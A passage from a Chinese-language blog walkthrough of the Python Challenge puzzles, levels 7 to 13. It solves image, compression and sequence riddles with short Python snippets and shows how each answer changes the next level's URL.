<p>发现，除了第一个之外，其余的像素点都重复了 7 次，因此我们剔除重复的：（上面的代码稍作修改） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)</span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>): <span class="comment"># 修改了这里</span></span><br><span class="line">    <span class="built_in">print</span>(row[i])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201122931.png" /></p>
<p>第四步，每个灰度图像都有一个灰度值，因此做一个猜测：<strong>将这些灰度值当作 ascii 码，然后转为字符。</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(info))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smart guy, you made it. the next level is [105, 110, 116, 101, 103, 114, 105, 116, 121]pe_ </span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>后边的 pe_ 我猜测是因为第一个像素点就重复了5次，而我取步长为7，导致每次取得都不是重复值里面得第一个，因为可能将重复值后面得无关的也取了进来。</p>
</blockquote>
<p>将上面结果中得数字也提取出来，当作 ascii 码处理，因此最终代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">img_url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/oxygen.png&quot;</span>  </span><br><span class="line">path = <span class="string">&quot;attachments/level_7/oxygen.png&quot;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">row = [img.getpixel((x, img.height/<span class="number">2</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width)]  </span><br><span class="line">info = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.width, <span class="number">7</span>):  </span><br><span class="line">    info.append(<span class="built_in">chr</span>(row[i][<span class="number">0</span>]))  </span><br><span class="line">message = <span class="string">&quot;&quot;</span>.join(info)  </span><br><span class="line"><span class="built_in">next</span> = re.findall(<span class="string">r&#x27;(\d+)&#x27;</span>, message)  </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">next</span>:  </span><br><span class="line">    v = <span class="built_in">int</span>(c)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">integrity</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/oxygen.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/integrity.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-8">level 8</h1>
<h2 id="题目信息-8">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221330.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221350.png" /></p>
<p>发现：</p>
<ol type="1">
<li>图片中的蜜蜂可以点开，点开之后会跳出一个验证界面 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201221552.png" /></li>
<li>绿色字符串正好对应的用户名和密码</li>
</ol>
<p>但是，很明显可以看出应该是经过某种编码的，后来发现，是通过 <strong>bz2</strong> 压缩得到的。而 python 自带了 <strong>bz2</strong> 库。</p>
<h2 id="方法-10">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bz2  </span><br><span class="line">un = <span class="string">b&#x27;BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084&#x27;</span>  </span><br><span class="line">pw = <span class="string">b&#x27;BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(bz2.decompress(un), bz2.decompress(pw))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;huge&#x27; b&#x27;file&#x27;</span><br><span class="line"></span><br><span class="line">用户名：huge</span><br><span class="line">密码：file</span><br></pre></td></tr></table></figure></p>
<p>然后成功登录，得到新的 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/good.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-9">level 9</h1>
<h2 id="题目信息-9">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230807.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201230823.png" /></p>
<p>最开始还以为是将图中的黑点连起来，后来想想应该不太可能，然后注意到 <code>first + second</code> ，但是 first 和 second 的长度都不同，无法相加，所以应该不是简单的相加。联想到 <code>connect the dots</code> 觉得应该是将 first 和 second 连接起来，那么 first 和 second 代表的就是点的坐标。</p>
<h2 id="方法-11">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">first = [<span class="number">146</span>,<span class="number">399</span>,<span class="number">163</span>,<span class="number">403</span>,<span class="number">170</span>,<span class="number">393</span>,<span class="number">169</span>,<span class="number">391</span>,<span class="number">166</span>,<span class="number">386</span>,<span class="number">170</span>,<span class="number">381</span>,<span class="number">170</span>,<span class="number">371</span>,<span class="number">170</span>,<span class="number">355</span>,<span class="number">169</span>,<span class="number">346</span>,<span class="number">167</span>,<span class="number">335</span>,<span class="number">170</span>,<span class="number">329</span>,<span class="number">170</span>,<span class="number">320</span>,<span class="number">170</span>,<span class="number">310</span>,<span class="number">171</span>,<span class="number">301</span>,<span class="number">173</span>,<span class="number">290</span>,<span class="number">178</span>,<span class="number">289</span>,<span class="number">182</span>,<span class="number">287</span>,<span class="number">188</span>,<span class="number">286</span>,<span class="number">190</span>,<span class="number">286</span>,<span class="number">192</span>,<span class="number">291</span>,<span class="number">194</span>,<span class="number">296</span>,<span class="number">195</span>,<span class="number">305</span>,<span class="number">194</span>,<span class="number">307</span>,<span class="number">191</span>,<span class="number">312</span>,<span class="number">190</span>,<span class="number">316</span>,<span class="number">190</span>,<span class="number">321</span>,<span class="number">192</span>,<span class="number">331</span>,<span class="number">193</span>,<span class="number">338</span>,<span class="number">196</span>,<span class="number">341</span>,<span class="number">197</span>,<span class="number">346</span>,<span class="number">199</span>,<span class="number">352</span>,<span class="number">198</span>,<span class="number">360</span>,<span class="number">197</span>,<span class="number">366</span>,<span class="number">197</span>,<span class="number">373</span>,<span class="number">196</span>,<span class="number">380</span>,<span class="number">197</span>,<span class="number">383</span>,<span class="number">196</span>,<span class="number">387</span>,<span class="number">192</span>,<span class="number">389</span>,<span class="number">191</span>,<span class="number">392</span>,<span class="number">190</span>,<span class="number">396</span>,<span class="number">189</span>,<span class="number">400</span>,<span class="number">194</span>,<span class="number">401</span>,<span class="number">201</span>,<span class="number">402</span>,<span class="number">208</span>,<span class="number">403</span>,<span class="number">213</span>,<span class="number">402</span>,<span class="number">216</span>,<span class="number">401</span>,<span class="number">219</span>,<span class="number">397</span>,<span class="number">219</span>,<span class="number">393</span>,<span class="number">216</span>,<span class="number">390</span>,<span class="number">215</span>,<span class="number">385</span>,<span class="number">215</span>,<span class="number">379</span>,<span class="number">213</span>,<span class="number">373</span>,<span class="number">213</span>,<span class="number">365</span>,<span class="number">212</span>,<span class="number">360</span>,<span class="number">210</span>,<span class="number">353</span>,<span class="number">210</span>,<span class="number">347</span>,<span class="number">212</span>,<span class="number">338</span>,<span class="number">213</span>,<span class="number">329</span>,<span class="number">214</span>,<span class="number">319</span>,<span class="number">215</span>,<span class="number">311</span>,<span class="number">215</span>,<span class="number">306</span>,<span class="number">216</span>,<span class="number">296</span>,<span class="number">218</span>,<span class="number">290</span>,<span class="number">221</span>,<span class="number">283</span>,<span class="number">225</span>,<span class="number">282</span>,<span class="number">233</span>,<span class="number">284</span>,<span class="number">238</span>,<span class="number">287</span>,<span class="number">243</span>,<span class="number">290</span>,<span class="number">250</span>,<span class="number">291</span>,<span class="number">255</span>,<span class="number">294</span>,<span class="number">261</span>,<span class="number">293</span>,<span class="number">265</span>,<span class="number">291</span>,<span class="number">271</span>,<span class="number">291</span>,<span class="number">273</span>,<span class="number">289</span>,<span class="number">278</span>,<span class="number">287</span>,<span class="number">279</span>,<span class="number">285</span>,<span class="number">281</span>,<span class="number">280</span>,<span class="number">284</span>,<span class="number">278</span>,<span class="number">284</span>,<span class="number">276</span>,<span class="number">287</span>,<span class="number">277</span>,<span class="number">289</span>,<span class="number">283</span>,<span class="number">291</span>,<span class="number">286</span>,<span class="number">294</span>,<span class="number">291</span>,<span class="number">296</span>,<span class="number">295</span>,<span class="number">299</span>,<span class="number">300</span>,<span class="number">301</span>,<span class="number">304</span>,<span class="number">304</span>,<span class="number">320</span>,<span class="number">305</span>,<span class="number">327</span>,<span class="number">306</span>,<span class="number">332</span>,<span class="number">307</span>,<span class="number">341</span>,<span class="number">306</span>,<span class="number">349</span>,<span class="number">303</span>,<span class="number">354</span>,<span class="number">301</span>,<span class="number">364</span>,<span class="number">301</span>,<span class="number">371</span>,<span class="number">297</span>,<span class="number">375</span>,<span class="number">292</span>,<span class="number">384</span>,<span class="number">291</span>,<span class="number">386</span>,<span class="number">302</span>,<span class="number">393</span>,<span class="number">324</span>,<span class="number">391</span>,<span class="number">333</span>,<span class="number">387</span>,<span class="number">328</span>,<span class="number">375</span>,<span class="number">329</span>,<span class="number">367</span>,<span class="number">329</span>,<span class="number">353</span>,<span class="number">330</span>,<span class="number">341</span>,<span class="number">331</span>,<span class="number">328</span>,<span class="number">336</span>,<span class="number">319</span>,<span class="number">338</span>,<span class="number">310</span>,<span class="number">341</span>,<span class="number">304</span>,<span class="number">341</span>,<span class="number">285</span>,<span class="number">341</span>,<span class="number">278</span>,<span class="number">343</span>,<span class="number">269</span>,<span class="number">344</span>,<span class="number">262</span>,<span class="number">346</span>,<span class="number">259</span>,<span class="number">346</span>,<span class="number">251</span>,<span class="number">349</span>,<span class="number">259</span>,<span class="number">349</span>,<span class="number">264</span>,<span class="number">349</span>,<span class="number">273</span>,<span class="number">349</span>,<span class="number">280</span>,<span class="number">349</span>,<span class="number">288</span>,<span class="number">349</span>,<span class="number">295</span>,<span class="number">349</span>,<span class="number">298</span>,<span class="number">354</span>,<span class="number">293</span>,<span class="number">356</span>,<span class="number">286</span>,<span class="number">354</span>,<span class="number">279</span>,<span class="number">352</span>,<span class="number">268</span>,<span class="number">352</span>,<span class="number">257</span>,<span class="number">351</span>,<span class="number">249</span>,<span class="number">350</span>,<span class="number">234</span>,<span class="number">351</span>,<span class="number">211</span>,<span class="number">352</span>,<span class="number">197</span>,<span class="number">354</span>,<span class="number">185</span>,<span class="number">353</span>,<span class="number">171</span>,<span class="number">351</span>,<span class="number">154</span>,<span class="number">348</span>,<span class="number">147</span>,<span class="number">342</span>,<span class="number">137</span>,<span class="number">339</span>,<span class="number">132</span>,<span class="number">330</span>,<span class="number">122</span>,<span class="number">327</span>,<span class="number">120</span>,<span class="number">314</span>,<span class="number">116</span>,<span class="number">304</span>,<span class="number">117</span>,<span class="number">293</span>,<span class="number">118</span>,<span class="number">284</span>,<span class="number">118</span>,<span class="number">281</span>,<span class="number">122</span>,<span class="number">275</span>,<span class="number">128</span>,<span class="number">265</span>,<span class="number">129</span>,<span class="number">257</span>,<span class="number">131</span>,<span class="number">244</span>,<span class="number">133</span>,<span class="number">239</span>,<span class="number">134</span>,<span class="number">228</span>,<span class="number">136</span>,<span class="number">221</span>,<span class="number">137</span>,<span class="number">214</span>,<span class="number">138</span>,<span class="number">209</span>,<span class="number">135</span>,<span class="number">201</span>,<span class="number">132</span>,<span class="number">192</span>,<span class="number">130</span>,<span class="number">184</span>,<span class="number">131</span>,<span class="number">175</span>,<span class="number">129</span>,<span class="number">170</span>,<span class="number">131</span>,<span class="number">159</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">134</span>,<span class="number">160</span>,<span class="number">130</span>,<span class="number">170</span>,<span class="number">125</span>,<span class="number">176</span>,<span class="number">114</span>,<span class="number">176</span>,<span class="number">102</span>,<span class="number">173</span>,<span class="number">103</span>,<span class="number">172</span>,<span class="number">108</span>,<span class="number">171</span>,<span class="number">111</span>,<span class="number">163</span>,<span class="number">115</span>,<span class="number">156</span>,<span class="number">116</span>,<span class="number">149</span>,<span class="number">117</span>,<span class="number">142</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">129</span>,<span class="number">115</span>,<span class="number">124</span>,<span class="number">115</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">120</span>,<span class="number">109</span>,<span class="number">122</span>,<span class="number">102</span>,<span class="number">122</span>,<span class="number">100</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">89</span>,<span class="number">115</span>,<span class="number">87</span>,<span class="number">110</span>,<span class="number">82</span>,<span class="number">109</span>,<span class="number">84</span>,<span class="number">118</span>,<span class="number">89</span>,<span class="number">123</span>,<span class="number">93</span>,<span class="number">129</span>,<span class="number">100</span>,<span class="number">130</span>,<span class="number">108</span>,<span class="number">132</span>,<span class="number">110</span>,<span class="number">133</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">107</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">140</span>,<span class="number">95</span>,<span class="number">138</span>,<span class="number">86</span>,<span class="number">141</span>,<span class="number">79</span>,<span class="number">149</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">90</span>,<span class="number">165</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">109</span>,<span class="number">171</span>,<span class="number">107</span>,<span class="number">161</span>,<span class="number">111</span>,<span class="number">156</span>,<span class="number">113</span>,<span class="number">170</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">118</span>,<span class="number">208</span>,<span class="number">117</span>,<span class="number">223</span>,<span class="number">121</span>,<span class="number">239</span>,<span class="number">128</span>,<span class="number">251</span>,<span class="number">133</span>,<span class="number">259</span>,<span class="number">136</span>,<span class="number">266</span>,<span class="number">139</span>,<span class="number">276</span>,<span class="number">143</span>,<span class="number">290</span>,<span class="number">148</span>,<span class="number">310</span>,<span class="number">151</span>,<span class="number">332</span>,<span class="number">155</span>,<span class="number">348</span>,<span class="number">156</span>,<span class="number">353</span>,<span class="number">153</span>,<span class="number">366</span>,<span class="number">149</span>,<span class="number">379</span>,<span class="number">147</span>,<span class="number">394</span>,<span class="number">146</span>,<span class="number">399</span>]  </span><br><span class="line">second = [<span class="number">156</span>,<span class="number">141</span>,<span class="number">165</span>,<span class="number">135</span>,<span class="number">169</span>,<span class="number">131</span>,<span class="number">176</span>,<span class="number">130</span>,<span class="number">187</span>,<span class="number">134</span>,<span class="number">191</span>,<span class="number">140</span>,<span class="number">191</span>,<span class="number">146</span>,<span class="number">186</span>,<span class="number">150</span>,<span class="number">179</span>,<span class="number">155</span>,<span class="number">175</span>,<span class="number">157</span>,<span class="number">168</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">157</span>,<span class="number">159</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">164</span>,<span class="number">159</span>,<span class="number">175</span>,<span class="number">159</span>,<span class="number">181</span>,<span class="number">157</span>,<span class="number">191</span>,<span class="number">154</span>,<span class="number">197</span>,<span class="number">153</span>,<span class="number">205</span>,<span class="number">153</span>,<span class="number">210</span>,<span class="number">152</span>,<span class="number">212</span>,<span class="number">147</span>,<span class="number">215</span>,<span class="number">146</span>,<span class="number">218</span>,<span class="number">143</span>,<span class="number">220</span>,<span class="number">132</span>,<span class="number">220</span>,<span class="number">125</span>,<span class="number">217</span>,<span class="number">119</span>,<span class="number">209</span>,<span class="number">116</span>,<span class="number">196</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">114</span>,<span class="number">172</span>,<span class="number">114</span>,<span class="number">167</span>,<span class="number">112</span>,<span class="number">161</span>,<span class="number">109</span>,<span class="number">165</span>,<span class="number">107</span>,<span class="number">170</span>,<span class="number">99</span>,<span class="number">171</span>,<span class="number">97</span>,<span class="number">167</span>,<span class="number">89</span>,<span class="number">164</span>,<span class="number">81</span>,<span class="number">162</span>,<span class="number">77</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">148</span>,<span class="number">87</span>,<span class="number">140</span>,<span class="number">96</span>,<span class="number">138</span>,<span class="number">105</span>,<span class="number">141</span>,<span class="number">110</span>,<span class="number">136</span>,<span class="number">111</span>,<span class="number">126</span>,<span class="number">113</span>,<span class="number">129</span>,<span class="number">118</span>,<span class="number">117</span>,<span class="number">128</span>,<span class="number">114</span>,<span class="number">137</span>,<span class="number">115</span>,<span class="number">146</span>,<span class="number">114</span>,<span class="number">155</span>,<span class="number">115</span>,<span class="number">158</span>,<span class="number">121</span>,<span class="number">157</span>,<span class="number">128</span>,<span class="number">156</span>,<span class="number">134</span>,<span class="number">157</span>,<span class="number">136</span>,<span class="number">156</span>,<span class="number">136</span>]  </span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">500</span>, <span class="number">500</span>))  </span><br><span class="line">draw = ImageDraw.Draw(img)  </span><br><span class="line">draw.polygon(first, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">draw.polygon(second, fill = <span class="string">&#x27;white&#x27;</span>)  </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></p>
<p>结果是： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231228.png" /></p>
<p>牛的英文是 cow，修改 url 为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/cow.html</span><br></pre></td></tr></table></figure>
<p>提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hmm. it&#x27;s a male.</span><br></pre></td></tr></table></figure></p>
<p>也就是公牛，英语为 bull。修改 url 为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/cow.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/bull.html</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如果出现验证的框，输入 level 8 得到的用户名和密码即可。</p>
</blockquote>
<p>其实，只有 first 也能画出这头牛，而 second 画出来的长这样： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201231802.png" /></p>
<p>不知道是否可以理解为 <strong>性器官？？？</strong></p>
<h1 id="level-10">level 10</h1>
<h2 id="题目信息-10">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202104810.png" /></p>
<p>注意到 <code>len(a[30]) = ?</code>。查看页面源码，发现图片中的牛可以点击，并且得到一个数组 a： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = [1, 11, 21, 1211, 111221,</span><br></pre></td></tr></table></figure></p>
<p>通过观察，发现这个数组并没有闭合。那么思路就是：<strong>通过数组的某种规律得到 a[30] 的值，然后再计算长度。</strong></p>
<p>通过查资料发现，这是外观序列。</p>
<blockquote>
<p>外观序列（Look-and-say sequence），是指以下特点的整数序列：</p>
<p>1, 11, 21, 1211, 111221, 312211, 13112221, 1113213211, ……</p>
<p>它以数字1开始，序列的第n+1项是对第n项的描述。比如第2项是2个1，所以下一项（第三项）就是21。又比如第5项是111221，描述就是3个1，2个2，1个1， 所以下一项就是312211。</p>
</blockquote>
<h2 id="方法-1-1">方法 1</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNext</span>(<span class="params">res</span>):</span>  </span><br><span class="line">    index, <span class="built_in">next</span> = <span class="number">0</span>, <span class="string">&quot;&quot;</span>  </span><br><span class="line"> <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res):  </span><br><span class="line">	count = <span class="number">1</span>  </span><br><span class="line">	<span class="keyword">while</span> index &lt; <span class="built_in">len</span>(res) - <span class="number">1</span> <span class="keyword">and</span> res[index] == res[index+<span class="number">1</span>]:  </span><br><span class="line">		count += <span class="number">1</span>  </span><br><span class="line">		index += <span class="number">1</span>  </span><br><span class="line">	<span class="built_in">next</span> += <span class="built_in">str</span>(count) + res[index]  </span><br><span class="line">	index += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countAndSay</span>(<span class="params">length</span>):</span>  </span><br><span class="line">    res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):  </span><br><span class="line">		res = getNext(res)</span><br><span class="line">	<span class="keyword">return</span>(res) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(countAndSay(<span class="number">31</span>)))</span><br></pre></td></tr></table></figure></p>
<p><strong>（注意，一定是 count 在前，res[index] 在后）</strong></p>
<p>得到结果：5808</p>
<p>因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/bull.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/5808.html</span><br></pre></td></tr></table></figure></p>
<h2 id="方法-2-1">方法 2</h2>
<p>利用正则表达式替代循环。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, <span class="string">&#x27;111221&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[(&#x27;1&#x27;, &#x27;11&#x27;), (&#x27;2&#x27;, &#x27;2&#x27;), (&#x27;1&#x27;, &#x27;&#x27;)]</span><br></pre></td></tr></table></figure></p>
<p>（假设元组第一个元素为 i，第二个元素为 j）那么与方法 1相比： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value == res[index]</span><br><span class="line">count == len(str(i+j))</span><br></pre></td></tr></table></figure></p>
<p>因此，最终代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">res = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):  </span><br><span class="line">    res = <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">len</span>(i+j))+i <span class="keyword">for</span> i, j <span class="keyword">in</span> re.findall(<span class="string">r&#x27;(\d)(\1*)&#x27;</span>, res)])  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br></pre></td></tr></table></figure></p>
<h1 id="level-11">level 11</h1>
<h2 id="题目信息-11">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111336.png" /></p>
<p>注意网站名字：<code>odd even</code></p>
<p>本题只有两个信息：</p>
<ol type="1">
<li>图片</li>
<li><code>odd even</code> 也就是奇数，偶数</li>
</ol>
<p>猜测：<strong>把图中奇数和偶数的像素点分开</strong></p>
<h2 id="方法-12">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_11/cave.jpg&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line">odd = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line">even = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (img.width, img.height))  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):  </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):  </span><br><span class="line">		pixel = img.getpixel((i, j))  </span><br><span class="line">        <span class="keyword">if</span> (i + j) % <span class="number">2</span> == <span class="number">1</span>: <span class="comment"># odd  </span></span><br><span class="line">			odd.putpixel((i, j), pixel)  </span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># even</span></span><br><span class="line">			even.putpixel((i, j), pixel)  </span><br><span class="line"></span><br><span class="line">odd.show()  </span><br><span class="line">even.show()</span><br></pre></td></tr></table></figure></p>
<p>得到两张图片： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220202111705.png" /></p>
<p>右边那张中有 <code>evil</code> 字样。因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/5808.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/evil.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-12">level 12</h1>
<h2 id="题目信息-12">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091240.png" /></p>
<p>查看源码，点击图片链接发现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/return/evil1.jpg</span><br></pre></td></tr></table></figure></p>
<p>后面有数字，猜想把数字改一下会不会有其他图片，果不其然。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091406.png" alt="evil2.jpg" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203091619.png" /></p>
<p>以上分别是2，3。注意到2，将后缀修改会下载得到一个文件。其实4还是有的，访问的时候并不是显示没有文件，而是显示 <code>因存在错误而无法显示</code>，利用下面命令访问： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -u huge:file http://www.pythonchallenge.com/pc/return/evil4.jpg</span><br></pre></td></tr></table></figure></p>
<p>得到一句话 <code>Bert is evil! go back!</code>。这么看来，信息应该就在刚刚下载的文件里。</p>
<p>注意到第一张图片中将牌分为了 5 叠（dealing the cards into 5 stacks），根据网站名 <code>deal evil</code> ，那么猜测：<strong>将下载的文件数据也分为 5 叠。</strong></p>
<h2 id="方法-13">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&#x27;attachments/level_12/evil2.gfx&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  </span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;attachments/level_12/%d.jpg&#x27;</span> % i, <span class="string">&#x27;wb&#x27;</span>).write(data[i::<span class="number">5</span>])</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203093800.png" /></p>
<p>由于 4 被划掉，不做考虑。分别是：<code>dis, pro, port, ional</code> ，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/evil.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/disproportional.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-13">level 13</h1>
<h2 id="题目信息-13">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203101659.png" /></p>
<p>查看页面源码发现： - <code>phone that &lt;remote /&gt; evil</code> - <code>5</code> 可以点击，结果为：<code>faultCode 105 faultString XML error 5: empty document</code></p>
